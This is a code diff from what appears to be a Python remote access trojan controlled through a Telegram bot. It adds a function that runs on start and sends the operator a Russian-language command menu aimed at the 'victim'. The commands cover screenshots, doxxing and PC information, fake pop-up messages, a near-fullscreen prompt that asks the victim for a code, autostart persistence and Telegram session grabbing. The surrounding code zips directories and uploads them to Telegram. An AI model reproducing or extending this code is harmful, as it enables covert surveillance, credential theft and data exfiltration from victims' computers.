@@ -51,6 +51,21 @@ def ip_info(message):
         bot.send_message(chat_id, error_message)
 user = os.path.expanduser("~")
 
+def send_message_on_start():
+    username = os.getlogin()
+    bot.send_message(chat_id, "КОМАНДЫ: '\n' /skrin - скриншот '\n' /dox - информация о пк '\n' /pc_info -  информация о пк'\n'/sms - вывести сообщение жертве: /msg_box текст'\n'/ip_info - инфо об айпи адресе'\n'/msg - вывести сообщение жертве с рамкой ответов'\n'/code - вывести рамку почти на весь экран с просьбой ввести код'\n' /avto - добавление в автозагрузку  ")
+    itembtn1 = types.KeyboardButton('/skrin')
+    itembtn2 = types.KeyboardButton('/dox')
+    itembtn3 = types.KeyboardButton('/pc_info')
+    itembtn4 = types.KeyboardButton('/sms')
+    itembtn5 = types.KeyboardButton('/ip_info')
+    itembtn6 = types.KeyboardButton('/msg')
+    itembtn7 = types.KeyboardButton('/code')
+    itembtn8 = types.KeyboardButton('/tg_grab')
+    itembtn9 = types.KeyboardButton('/drop')
+    itembtn11 = types.KeyboardButton('/code')
+send_message_on_start()
+
 def send_zip_to_telegram(telegram_bot_token, chat_id, source_dir):
   def send_file_to_telegram_in_memory(chat_id, file_data, file_name):
     url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
